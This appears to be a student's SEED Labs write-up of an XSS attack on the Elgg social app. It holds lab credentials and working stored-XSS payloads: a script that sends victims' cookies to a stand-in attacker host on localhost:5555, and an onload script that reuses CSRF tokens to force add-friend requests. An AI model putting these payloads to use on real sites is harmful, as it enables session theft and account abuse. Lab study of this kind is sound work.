@@ -1,0 +1,73 @@
+* Setup
+** Docker Compose Setup
+*** cd category-web/Web_XSS_Elgg/Labsetup
+*** docker-compose up
+*** modify the /etc/hosts file with the following configurations
+      10.9.0.5 www.seed-server.com
+      10.9.0.5 www.example32a.com
+      10.9.0.5 www.example32b.com
+      10.9.0.5 www.example32c.com
+      10.9.0.5 www.example60.com
+      10.9.0.5 www.example70.com
+*** Go to www.seed-server.com and if you find the login page then the setup is complete
+
+** Credentials
+|----------+-------------|
+| UserName | Password    |
+|----------+-------------|
+| admin    | seedelgg    |
+|----------+-------------|
+| alice    | seedalice   |
+|----------+-------------|
+| boby     | seedboby    |
+|----------+-------------|
+| charlie  | seedcharlie |
+|----------+-------------|
+| samy     | seedsamy    |
+|----------+-------------|
+
+
+* Task 1
+** Insert malacious JS script tag in the about me section of profile
+#+BEGIN_SRC js
+    <script>alert("XSS");</script>
+#+END_SRC
+** Screenshot
+    [[./screenshots/task-1-inject-js.png]]
+
+
+* Task 2
+** Insert malacious JS script tag in the about me section of profile
+#+BEGIN_SRC js
+    <script>alert(document.cookie);</script>
+#+END_SRC
+** Screenshot
+    [[./screenshots/task-2-display-cookie.png]]
+
+
+* Task 3 
+    Since we are simulating the cookie stealing using a server, we are assuming localhost is the host machine setup by the attacker. 
+** Insert malacious JS script tag in the about me section of profile
+#+BEGIN_SRC js
+    <script>document.write('<img src=http://localhost:5555?c='+escape(document.cookie)+'>');</script>
+#+END_SRC
+** Screenshot
+    [[./screenshots/task-3-steal-cookie.png]]
+
+
+* Task 4
+#+BEGIN_SRC js
+<script type="text/javascript">
+  window.onload = function () {
+    var Ajax=null;
+    var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
+    var token="&__elgg_token="+elgg.security.token.__elgg_token;
+    //Construct the HTTP request to add Samy as a friend.
+    var sendurl=`http://www.seed-server.com/action/friends/add?friend=59&__elgg_ts=${ts}&__elgg_token=${token}`; 
+    //Create and send Ajax request to add friend
+    Ajax=new XMLHttpRequest();
+    Ajax.open("GET", sendurl, true);
+    Ajax.send();
+}
+</script>
+#+END_SRC
